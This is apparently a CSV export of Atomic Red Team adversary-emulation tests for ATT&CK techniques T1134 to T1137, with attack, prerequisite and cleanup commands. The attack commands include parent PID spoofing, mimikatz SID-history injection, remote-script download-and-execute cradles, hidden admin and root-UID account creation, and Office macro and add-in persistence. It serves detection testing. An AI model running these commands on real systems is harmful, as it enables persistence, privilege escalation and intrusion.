"TechniqueID","TestName","Command","PrereqCommand","CleanupCommand","SourceFile"
"T1134.004","Parent PID Spoofing - Spawn from Specified Process","Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}","Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
","","C:\AtomicRedTeam\atomics\T1134.004\T1134.004.yaml"
"T1134.004","Parent PID Spoofing - Spawn from svchost.exe","Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter ""Name = 'svchost.exe' AND CommandLine LIKE '%'"" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'","Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
","","C:\AtomicRedTeam\atomics\T1134.004\T1134.004.yaml"
"T1134.004","Parent PID Spoofing - Spawn from New Process","Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'","Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
","","C:\AtomicRedTeam\atomics\T1134.004\T1134.004.yaml"
"T1134.005","Injection SID-History with mimikatz","#{mimikatz_path} ""privilege::debug"" ""sid::patch"" ""sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}"" ""exit""
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath
","#{mimikatz_path} ""sid::clear /sam:#{sam_account_name}"" ""exit""
","C:\AtomicRedTeam\atomics\T1134.005\T1134.005.yaml"
"T1135","Network Share Discovery","df -aH
smbutil view -g //#{computer_name}
showmount #{computer_name}
","","","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","Network Share Discovery - linux","smbstatus --shares
","#{package_installer}
","","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","Network Share Discovery - FreeBSD","smbstatus --shares
","#{package_installer} 
","","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","Network Share Discovery command prompt","net view \\#{computer_name}
","","","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","Network Share Discovery PowerShell","get-smbshare
","","","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","View available share drives","net share
","","","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","Share Discovery with PowerView","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
","""Join system to domain""
","","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","PowerView ShareFinder","Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Invoke-ShareFinder #{parameters}
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
","","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","WinPwn - shareenumeration","iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
shareenumeration -noninteractive -consoleoutput","","","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","Network Share Discovery via dir command","dir \\#{computer_ip}\c$
dir \\#{computer_ip}\admin$
dir \\#{computer_ip}\IPC$
","","","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","Enumerate All Network Shares with SharpShares","cmd /c '#{sharp_path}' /ldap:all | out-file -filepath ""#{output_path}""","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/mitchmoser/SharpShares/releases/download/v2.4/SharpShares.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe""","remove-item ""#{output_path}"" -force -erroraction silentlycontinue","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1135","Enumerate All Network Shares with Snaffler","invoke-expression 'cmd /c start powershell -command { cmd /c ""#{snaffler_path}"" -a -o ""#{output_path}"" }; start-sleep 90; stop-process -name ""snaffler""'
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Snaffler.exe""","remove-item ""#{output_path}"" -force -erroraction silentlycontinue","C:\AtomicRedTeam\atomics\T1135\T1135.yaml"
"T1136.001","Create a user account on a Linux system","useradd -M -N -r -s /bin/bash -c evil_account #{username}
","","userdel #{username}
","C:\AtomicRedTeam\atomics\T1136.001\T1136.001.yaml"
"T1136.001","Create a user account on a FreeBSD system","pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
","","rmuser -y #{username}
","C:\AtomicRedTeam\atomics\T1136.001\T1136.001.yaml"
"T1136.001","Create a user account on a MacOS system","dscl . -create /Users/#{username}
dscl . -create /Users/#{username} UserShell /bin/zsh
dscl . -create /Users/#{username} RealName ""#{realname}""
dscl . -create /Users/#{username} UniqueID ""1010""
dscl . -create /Users/#{username} PrimaryGroupID 80
dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}
","","dscl . -delete /Users/#{username}
","C:\AtomicRedTeam\atomics\T1136.001\T1136.001.yaml"
"T1136.001","Create a new user in a command prompt","net user /add ""#{username}"" ""#{password}""
","","net user /del ""#{username}"" >nul 2>&1
","C:\AtomicRedTeam\atomics\T1136.001\T1136.001.yaml"
"T1136.001","Create a new user in PowerShell","New-LocalUser -Name ""#{username}"" -NoPassword
","","Remove-LocalUser -Name ""#{username}"" -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1136.001\T1136.001.yaml"
"T1136.001","Create a new user in Linux with `root` UID and GID.","useradd -g 0 -M -d /root -s /bin/bash #{username}
if [ $(cat /etc/os-release | grep -i 'Name=""ubuntu""') ]; then echo ""#{username}:#{password}"" | sudo chpasswd; else echo ""#{password}"" | passwd --stdin #{username}; fi;
","","userdel #{username}
","C:\AtomicRedTeam\atomics\T1136.001\T1136.001.yaml"
"T1136.001","Create a new user in FreeBSD with `root` GID.","pw useradd #{username} -g 0 -d /root -s /bin/sh
echo ""#{password}"" | pw usermod #{username} -h 0
","","pw userdel #{username}
","C:\AtomicRedTeam\atomics\T1136.001\T1136.001.yaml"
"T1136.001","Create a new Windows admin user","net user /add ""#{username}"" ""#{password}""
net localgroup administrators ""#{username}"" /add
","","net user /del ""#{username}"" >nul 2>&1
","C:\AtomicRedTeam\atomics\T1136.001\T1136.001.yaml"
"T1136.001","Create a new Windows admin user via .NET","iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')","","","C:\AtomicRedTeam\atomics\T1136.001\T1136.001.yaml"
"T1136.001","Create a Linux user via kubectl in a Pod","kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- sh -lc 'adduser -D #{username} && id #{username}'
","echo ""kubectl must be installed manually""
","","C:\AtomicRedTeam\atomics\T1136.001\T1136.001.yaml"
"T1136.002","Create a new Windows domain admin user","net user ""#{username}"" ""#{password}"" /add /domain
net group ""#{group}"" ""#{username}"" /add /domain
","","net user ""#{username}"" >nul 2>&1 /del /domain
","C:\AtomicRedTeam\atomics\T1136.002\T1136.002.yaml"
"T1136.002","Create a new account similar to ANONYMOUS LOGON","net user ""#{username}"" ""#{password}"" /add /domain
","","net user ""#{username}"" >nul 2>&1 /del /domain
","C:\AtomicRedTeam\atomics\T1136.002\T1136.002.yaml"
"T1136.002","Create a new Domain Account using PowerShell","$SamAccountName = '#{username}'
$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
$User.SamAccountName = $SamAccountName
$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
$User.SetPassword($TempCred.GetNetworkCredential().Password)
$User.Enabled = $True
$User.PasswordNotRequired = $False
$User.DisplayName = $SamAccountName
$User.Save()
$User
","","cmd /c ""net user #{username} /del >nul 2>&1""
","C:\AtomicRedTeam\atomics\T1136.002\T1136.002.yaml"
"T1136.002","Active Directory Create Admin Account","echo ""dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}"" > tempadmin.ldif
echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
","echo ldapadd or ldapmodify not found; exit 1
","echo removing Atomic User (temporary user)
echo ""dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete"" > deleteuser.ldif
ldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif
rm deleteuser.ldif
rm tempadmin.ldif
","C:\AtomicRedTeam\atomics\T1136.002\T1136.002.yaml"
"T1136.002","Active Directory Create User Account (Non-elevated)","echo ""dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\nobjectClass: person\ncn: Atomic User\nsn: User"" > tempadmin.ldif
echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
","echo ldapadd or ldapmodify not found; exit 1
","echo removing Atomic User (temporary user)
echo ""dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete"" > deleteuser.ldif
ldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif
rm deleteuser.ldif
rm tempadmin.ldif
","C:\AtomicRedTeam\atomics\T1136.002\T1136.002.yaml"
"T1136.003","AWS - Create a new IAM user","aws iam create-user --user-name #{username}
","echo Please install the aws-cli and configure your AWS defult profile using: aws configure
","aws iam delete-user --user-name #{username}
","C:\AtomicRedTeam\atomics\T1136.003\T1136.003.yaml"
"T1136.003","Azure AD - Create a new user","Connect-AzureAD
$userprincipalname = ""#{userprincipalname}""
$username = ""#{username}""      
$password = ""#{password}""
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
$PasswordProfile.Password = $password
New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username      ","echo ""use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force""
---
echo ""Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment""","Remove-AzureADUser -ObjectId ""#{userprincipalname}""","C:\AtomicRedTeam\atomics\T1136.003\T1136.003.yaml"
"T1136.003","Azure AD - Create a new user via Azure CLI","az login
$userprincipalname = ""#{userprincipalname}""
$username = ""#{username}""      
$password = ""#{password}""
az ad user create --display-name $username --password $password --user-principal-name $userprincipalname
az ad user list --filter ""displayname eq 'atomicredteam'""     ","echo ""use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows""
---
echo ""use the following to install the Azure CLI $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\AzureCLI.msi""
---
echo ""Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment""","az ad user delete --id ""#{userprincipalname}""","C:\AtomicRedTeam\atomics\T1136.003\T1136.003.yaml"
"T1137","Office Application Startup - Outlook as a C2","reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security"" /v Level /t REG_DWORD /d 1 /f
mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
echo ""Atomic Red Team TEST"" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
","","reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security"" /v Level /f >nul 2>&1
del %APPDATA%\Microsoft\Outlook\VbaProject.OTM >nul 2>&1
","C:\AtomicRedTeam\atomics\T1137\T1137.yaml"
"T1137.001","Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell","# Registry setting to ""Trust access to the VBA project object model"" in Word
$registryKey = ""HKCU:Software\Microsoft\Office\16.0\Word\Security""
$registryValue = ""AccessVBOM""
$registryData = ""1""
# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
$flagPath1 = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt""
$flagPath2 = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt""
# Get the value of the Key/Value pair
$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
# Logical operation to: if the value of the key/value is 1, do nothing - 
# if the value is 0, change it to 1 and create flag1 - 
# if it doesn't exist, create the value and flag2
if ($value -eq ""1"") 
{
  Write-Host ""The registry value '$registryValue' already exists with the required setting.""
}   
  elseif ($value -eq ""0"") 
{
  Write-Host ""The registry value was set to 0, temporarily changing to 1.""
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
  echo ""flag1"" > $flagPath1
} 
  else 
{
  Write-Host ""The registry value '$registryValue' does not exist, temporarily creating it.""
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
  echo ""flag2"" > $flagPath2
}
Add-Type -AssemblyName Microsoft.Office.Interop.Word
# Define the path of copied normal template for restoral
$copyPath = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm""
# Define the path to the normal template
$docPath = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm""
# Create copy of orginal template for restoral
Copy-Item -Path $docPath -Destination $copyPath -Force
# VBA code to be insterted as a Macro
# Will create a scheduled task to open the Calculator at 8:04pm daily
$vbaCode = @""
  Sub AutoExec()
  Dim applicationPath As String
  Dim taskName As String
  Dim runTime As String
  Dim schTasksCmd As String
  applicationPath = ""C:\Windows\System32\calc.exe""
  taskName = ""OpenCalcTask""
  runTime = ""20:04""
  schTasksCmd = ""schtasks /create /tn """""" & taskName & """""" /tr """""" & applicationPath & """""" /sc daily /st "" & runTime & "" /f""
  Shell ""cmd.exe /c "" & schTasksCmd, vbNormalFocus
  End Sub
""@
# Create a new instance of Word.Application
$word = New-Object -ComObject Word.Application
# Keep the Word application hidden
$word.Visible = $false
# Open the document
$document = $word.Documents.Open($docPath)
# Access the VBA project of the document
$vbaProject = $document.VBProject
# Add a new module to the VBA project
$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule
# Add the VBA code to the new module
$newModule.CodeModule.AddFromString($vbaCode)
# Run the Macro
$word.run(""AutoExec"")
# Save and close the document
$document.SaveAs($docPath)
$document.Close()
# Quit Word
$word.Quit()
# Release COM objects
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null
","Write-Host ""You will need to install Microsoft Word manually to meet this requirement""
","# Registry setting to ""Trust access to the VBA project object model"" in Word
$registryKey = ""HKCU:Software\Microsoft\Office\16.0\Word\Security""
$registryValue = ""AccessVBOM""
$registryData1 = ""1""
$registryData0 = ""0""
# Defines the path each flag file created depending on the original registry state
$flagPath1 = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt""
$flagPath2 = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt""
# Define the path of copied normal template for restoral
$copyPath = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm""
# Define the path to the normal template
$docPath = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm""
# Delete the scheduled task created by the Macro
schtasks /Delete /TN ""OpenCalcTask"" /F | Out-Null
#Restore the orginal template if the backup copy exists
if (Test-Path $copyPath)
{
  #Delete the injected template
  Remove-Item -Force $docPath -ErrorAction SilentlyContinue
  # Restore the original template
  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue
  Write-Host ""The original template has been restored""
}
  else
{
  Write-Host ""The original template is present""
}
#Restore the original state of the registry key
if (Test-Path $flagPath1) 
{
  # The value was originally 0, set back to 0
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null
  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue
  Write-Host ""The original registry state has been restored""
} 
  elseif (Test-Path $flagPath2)
{
  #The value did not previously exist, delete the value
  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null
  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null
  Write-Host ""The original registry state has been restored""
}
  else 
{
  # The value was already 1, do nothing
  Write-Host ""The value $registryValue already existed in $registryKey.""
}
","C:\AtomicRedTeam\atomics\T1137.001\T1137.001.yaml"
"T1137.002","Office Application Startup Test Persistence (HKCU)","$wdApp = New-Object -COMObject ""Word.Application""
if(-not $wdApp.path.contains(""Program Files (x86)""))  
{
  Write-Host ""64-bit Office""
  reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll"" /f       
}
else{
  Write-Host ""32-bit Office""
  reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll"" /f
}
Stop-Process -Name ""WinWord"" 
Start-Process ""WinWord""
","Write-Host ""You will need to install Microsoft Word manually to meet this requirement""

---
New-Item -Type Directory ""PathToAtomicsFolder\T1137.002\bin\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x64.dll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll""
Invoke-Webrequest -Uri ""htps://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.002/bin/officetest_x86.dll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll""","Stop-Process -Name ""notepad"",""WinWord"" -ErrorAction Ignore
Remove-Item ""HKCU:\Software\Microsoft\Office test\Special\Perf"" -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1137.002\T1137.002.yaml"
"T1137.004","Install Outlook Home Page Persistence","reg.exe add HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f
","","reg.exe delete HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /f >nul 2>&1
","C:\AtomicRedTeam\atomics\T1137.004\T1137.004.yaml"
"T1137.006","Code Executed Via Excel Add-in File (XLL)","$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"")
}
else{
  Write-Host ""32-bit Office""
  $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")
}
","Write-Host ""You will need to install Microsoft Excel manually to meet this requirement""

---
New-Item -Type Directory ""PathToAtomicsFolder\T1137.006\bin\Addins\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll""
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll""","Stop-Process -Name ""notepad"",""Excel"" -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1137.006\T1137.006.yaml"
"T1137.006","Persistent Code Execution Via Excel Add-in File (XLL)","$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""
}
else{
  Write-Host ""32-bit Office""
  Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""
}
$ver = $excelApp.version
$ExcelRegPath=""HKCU:\Software\Microsoft\Office\$Ver\Excel\Options""
Remove-Item $ExcelRegPath -ErrorAction Ignore
New-Item -type Directory $ExcelRegPath | Out-Null
New-ItemProperty $ExcelRegPath OPEN -value ""/R notepad.xll"" -propertyType string | Out-Null
$excelApp.Quit()
Start-Process ""Excel""
","Write-Host ""You will need to install Microsoft Excel manually to meet this requirement""

---
New-Item -Type Directory ""PathToAtomicsFolder\T1137.006\bin\Addins\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll""
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll""","$ver = (New-Object -COMObject ""Excel.Application"").version
Remove-Item ""HKCU:\Software\Microsoft\Office\$Ver\Excel\Options"" -ErrorAction Ignore
Stop-Process -Name ""notepad"",""Excel"" -ErrorAction Ignore
Start-Sleep 3
Remove-Item ""$env:APPDATA\Microsoft\AddIns\notepad.xll"" -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1137.006\T1137.006.yaml"
"T1137.006","Persistent Code Execution Via Word Add-in File (WLL)","$wdApp = New-Object -COMObject ""Word.Application""
if(-not $wdApp.path.contains(""Program Files (x86)""))  
{
  Write-Host ""64-bit Office""
  Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll"" ""$env:APPDATA\Microsoft\Word\Startup\notepad.wll""        
}
else{
  Write-Host ""32-bit Office""
  Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll"" ""$env:APPDATA\Microsoft\Word\Startup\notepad.wll""
}
Stop-Process -Name ""WinWord"" 
Start-Process ""WinWord""
","Write-Host ""You will need to install Microsoft Word manually to meet this requirement""

---
New-Item -Type Directory ""PathToAtomicsFolder\T1137.006\bin\Addins\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x64.wll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll""
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x86.wll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll""","Stop-Process -Name ""notepad"",""WinWord"" -ErrorAction Ignore
Start-Sleep 3
Remove-Item ""$env:APPDATA\Microsoft\Word\Startup\notepad.wll"" -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1137.006\T1137.006.yaml"
"T1137.006","Persistent Code Execution Via Excel VBA Add-in File (XLAM)","Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam"" ""$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam""        
Start-Process ""Excel""
","Write-Host ""You will need to install Microsoft Excel manually to meet this requirement""

---
New-Item -Type Directory ""PathToAtomicsFolder\T1137.006\bin\Addins\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/ExcelVBAaddin.xlam"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam""","Stop-Process -Name ""notepad"",""Excel"" -ErrorAction Ignore
Start-Sleep 3
Remove-Item ""$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam"" -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1137.006\T1137.006.yaml"
